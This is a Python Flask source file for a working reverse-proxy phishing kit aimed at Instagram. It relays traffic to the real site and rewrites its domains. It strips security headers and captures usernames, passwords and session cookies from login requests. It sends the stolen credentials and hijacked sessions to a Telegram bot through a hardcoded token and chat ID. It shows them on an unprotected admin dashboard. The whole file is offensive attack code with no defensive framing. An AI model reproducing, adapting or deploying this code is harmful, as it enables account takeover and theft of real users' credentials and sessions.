from flask import Flask, request, render_template, make_response, redirect, url_for, after_this_request
import requests
import logging
import json
from datetime import datetime
import os
import urllib3
import re
from urllib.parse import urljoin, urlparse

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

TELEGRAM_BOT_TOKEN = os.environ.get('TELEGRAM_BOT_TOKEN', '8554468568:AAFvQJVSo6TtBao6xreo_Zf1DxnFupKVTrc')
TELEGRAM_CHAT_ID = os.environ.get('TELEGRAM_CHAT_ID', '1367401179')

app = Flask(__name__, template_folder='templates')
app.secret_key = os.urandom(32).hex()
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(message)s')

captured_sessions = {}
captured_creds = {}

class PhishletEngine:
    def __init__(self, name, target_domain, proxy_hosts, auth_tokens, creds_fields, auth_urls):
        self.name = name
        self.target_domain = target_domain
        self.proxy_hosts = proxy_hosts
        self.auth_tokens = auth_tokens
        self.creds_fields = creds_fields
        self.auth_urls = auth_urls

    def send_to_telegram(self, message):
        try:
            url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
            payload = {'chat_id': TELEGRAM_CHAT_ID, 'text': message, 'parse_mode': 'HTML'}
            requests.post(url, json=payload, timeout=10)
        except Exception as e:
            logging.error(f"Telegram error: {e}")

    def notify_visit(self, ip, ua):
        msg = f"👀 <b>New Visitor</b>\n🌐 <b>IP:</b> <code>{ip}</code>\n📱 <b>UA:</b> <code>{ua[:100]}</code>"
        self.send_to_telegram(msg)

    def is_login_request(self, path):
        """تحديد ما إذا كان الطلب هو طلب تسجيل دخول حقيقي"""
        login_patterns = ['/api/v1/web/accounts/login/', '/accounts/login/ajax/', '/login/']
        return any(pattern in path for pattern in login_patterns)

    def extract_login_credentials(self, data):
        """استخراج اسم المستخدم وكلمة المرور من JSON إذا كانت موجودة"""
        credentials = {}
        if isinstance(data, dict):
            # البحث عن الحقول المعروفة
            if 'username' in data:
                credentials['username'] = data['username']
            if 'enc_password' in data:
                credentials['enc_password'] = data['enc_password']
            if 'password' in data:
                credentials['password'] = data['password']
            if 'email' in data:
                credentials['email'] = data['email']
            # التعامل مع الحالات التي يكون فيها اسم المستخدم في حقل آخر
            if 'identifier' in data:
                credentials['identifier'] = data['identifier']
        return credentials

    def capture_creds(self, request_data, content_type, path):
        """التقط بيانات الدخول فقط من طلبات تسجيل الدخول الحقيقية"""
        logging.info(f"Received data on path: {path}")
        
        # نتجاهل الطلبات التي ليست لتسجيل الدخول
        if not self.is_login_request(path):
            return None

        # محاولة تحليل JSON
        if isinstance(request_data, str):
            try:
                request_data = json.loads(request_data)
            except:
                return None

        # استخراج بيانات الاعتماد
        credentials = self.extract_login_credentials(request_data)

        if credentials:
            cred_id = datetime.now().strftime("%y%m%d_%H%M%S")
            captured_creds[cred_id] = {
                'site': self.name, 'credentials': credentials, 'timestamp': str(datetime.now()),
                'ip': request.remote_addr, 'user_agent': request.headers.get('User-Agent')
            }
            msg = (f"🔐 <b>New Credentials Captured</b>\n🎯 <b>Target:</b> {self.name}\n🆔 <b>ID:</b> <code>{cred_id}</code>\n"
                   f"🕒 <b>Time:</b> {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n📋 <b>Data:</b>\n<pre>{json.dumps(credentials, indent=2, ensure_ascii=False)}</pre>")
            self.send_to_telegram(msg)
            logging.info(f"Login credentials captured: {credentials}")
            return credentials
        return None

    def capture_full_session(self, cookies_jar, current_host, creds_data=None):
        cookies_dict = {}
        if hasattr(cookies_jar, 'get_dict'):
            cookies_dict = cookies_jar.get_dict()
        else:
            for cookie in cookies_jar:
                cookies_dict[cookie.name] = cookie.value

        # التحقق من وجود كوكيز الجلسة الأساسية
        essential_cookies = ['sessionid', 'ds_user_id', 'csrftoken']
        has_essential = any(cookie in cookies_dict for cookie in essential_cookies)

        if cookies_dict and has_essential:
            session_id = datetime.now().strftime("%y%m%d_%H%M%S")
            captured_sessions[session_id] = {
                'site': self.name, 'cookies': cookies_dict, 'timestamp': str(datetime.now()),
                'ip': request.remote_addr, 'user_agent': request.headers.get('User-Agent')
            }
            # إرسال عينة صغيرة من الكوكيز
            sample_items = {k: v[:30] + '...' for k, v in list(cookies_dict.items())[:5]}
            msg = (f"🔥 <b>Full Session Hijacked!</b>\n🎯 <b>Service:</b> {self.name}\n🆔 <b>Session ID:</b> <code>{session_id}</code>\n"
                   f"🕒 <b>Time:</b> {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n📦 <b>Total Cookies:</b> {len(cookies_dict)}\n")
            if creds_data:
                msg += f"🔐 <b>Credentials also captured!</b>\n"
            msg += f"🍪 <b>Cookies (first 5):</b>\n<pre>{json.dumps(sample_items, indent=2)}</pre>\n"
            msg += f"🔗 <b>Dashboard:</b> https://{current_host}/admin/dashboard"
            self.send_to_telegram(msg)
            logging.info(f"Session {session_id} captured with {len(cookies_dict)} cookies")
            return session_id
        return None

    def rewrite_content(self, content, content_type, current_host):
        if 'text/html' in content_type or 'application/javascript' in content_type:
            try:
                if isinstance(content, bytes):
                    content = content.decode('utf-8', errors='ignore')
                content = content.replace(f"https://{self.target_domain}", f"https://{current_host}")
                content = content.replace(f"http://{self.target_domain}", f"https://{current_host}")
                for proxy in self.proxy_hosts:
                    orig_domain = f"{proxy['orig_sub']}.{self.target_domain}" if proxy['orig_sub'] else self.target_domain
                    content = content.replace(orig_domain, current_host)
                return content.encode('utf-8')
            except Exception as e:
                logging.error(f"Rewrite error: {e}")
                return content
        return content

# إعدادات إنستجرام
phishlet = PhishletEngine(
    name='Instagram',
    target_domain='www.instagram.com',
    proxy_hosts=[
        {'phish_sub': 'www', 'orig_sub': 'www', 'domain': 'instagram.com'},
        {'phish_sub': 'i', 'orig_sub': 'i', 'domain': 'instagram.com'},
        {'phish_sub': 'help', 'orig_sub': 'help', 'domain': 'instagram.com'},
        {'phish_sub': 'about', 'orig_sub': 'about', 'domain': 'instagram.com'},
        {'phish_sub': 'blog', 'orig_sub': 'blog', 'domain': 'instagram.com'}
    ],
    auth_tokens=[
        'sessionid', 'ds_user_id', 'csrftoken', 'rur', 'mid', 'ig_did', 'datr', 'shbid', 'shbts'
    ],
    creds_fields=[],  # لم نعد نعتمد على هذه القائمة
    auth_urls=[
        'https://www.instagram.com/accounts/onetap/?next=%2F',
        'https://www.instagram.com/direct/inbox/',
        'https://www.instagram.com/'
    ]
)

@app.before_request
def check_visit():
    if request.path == '/' and 'visited' not in request.cookies:
        phishlet.notify_visit(request.remote_addr, request.headers.get('User-Agent', 'Unknown'))
        @after_this_request
        def set_visit_cookie(response):
            response.set_cookie('visited', '1', max_age=3600)
            return response

@app.route('/admin/dashboard')
def admin_dashboard():
    try:
        return render_template('dashboard.html', sessions=captured_sessions, creds=captured_creds, bot_username='Amrsavebot')
    except Exception as e:
        return f"Dashboard Error: {str(e)}", 500

@app.route('/admin/session/<session_id>')
def get_session(session_id):
    if session_id in captured_sessions:
        return make_response(json.dumps(captured_sessions[session_id], indent=2, ensure_ascii=False), 200, {'Content-Type': 'application/json; charset=utf-8'})
    return "Session not found", 404

@app.route('/admin/cred/<cred_id>')
def get_cred(cred_id):
    if cred_id in captured_creds:
        return make_response(json.dumps(captured_creds[cred_id], indent=2, ensure_ascii=False), 200, {'Content-Type': 'application/json; charset=utf-8'})
    return "Credential not found", 404

@app.route('/admin/clear')
def clear_sessions():
    captured_sessions.clear()
    captured_creds.clear()
    return redirect(url_for('admin_dashboard'))

@app.route('/', defaults={'path': ''})
@app.route('/<path:path>', methods=['GET', 'POST', 'PUT', 'DELETE'])
def proxy(path):
    host = request.headers.get('Host', '').split(':')[0]
    engine = phishlet

    base_url = f"https://{engine.target_domain}"
    target_url = urljoin(base_url, path)
    if request.query_string:
        target_url += '?' + request.query_string.decode('utf-8')

    headers = {k: v for k, v in request.headers if k.lower() not in ['host', 'content-length', 'accept-encoding', 'connection']}
    headers['User-Agent'] = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36'
    headers['Referer'] = f"https://{engine.target_domain}/"

    captured_creds_data = None
    content_type = request.headers.get('Content-Type', '')
    if request.method == 'POST':
        if 'application/json' in content_type:
            data = request.get_json(silent=True) or {}
            captured_creds_data = engine.capture_creds(data, content_type, path)
        else:
            captured_creds_data = engine.capture_creds(request.form.to_dict(), content_type, path)

    try:
        resp = requests.request(
            method=request.method,
            url=target_url,
            headers=headers,
            cookies=request.cookies,
            data=request.get_data(),
            allow_redirects=False,
            verify=False,
            timeout=30
        )

        # معالجة التوجيه (redirects)
        if resp.status_code in [301, 302, 303, 307, 308]:
            location = resp.headers.get('Location', '')
            if location:
                parsed = urlparse(location)
                if engine.target_domain in parsed.netloc or 'instagram.com' in parsed.netloc:
                    new_location = location.replace(parsed.netloc, host)
                else:
                    new_location = location
                proxy_resp = make_response('', resp.status_code)
                proxy_resp.headers['Location'] = new_location
                for cookie_name, cookie_value in resp.cookies.items():
                    proxy_resp.set_cookie(cookie_name, cookie_value, domain=host, secure=True, httponly=True, samesite='Lax')
                if resp.cookies:
                    engine.capture_full_session(resp.cookies, host, captured_creds_data)
                return proxy_resp

        # معالجة المحتوى العادي
        content = engine.rewrite_content(resp.content, resp.headers.get('Content-Type', ''), host)
        proxy_resp = make_response(content)
        proxy_resp.status_code = resp.status_code

        for n, v in resp.headers.items():
            if n.lower() not in ['content-encoding', 'content-length', 'transfer-encoding', 'strict-transport-security', 'content-security-policy']:
                proxy_resp.headers[n] = v

        for cookie_name, cookie_value in resp.cookies.items():
            proxy_resp.set_cookie(cookie_name, cookie_value, domain=host, secure=True, httponly=True, samesite='Lax')

        if resp.cookies:
            engine.capture_full_session(resp.cookies, host, captured_creds_data)

        return proxy_resp

    except Exception as e:
        logging.error(f"Proxy error: {str(e)}")
        return f"Service Unavailable", 503

if __name__ == '__main__':
    port = int(os.environ.get('PORT', 10000))
    app.run(host='0.0.0.0', port=port)
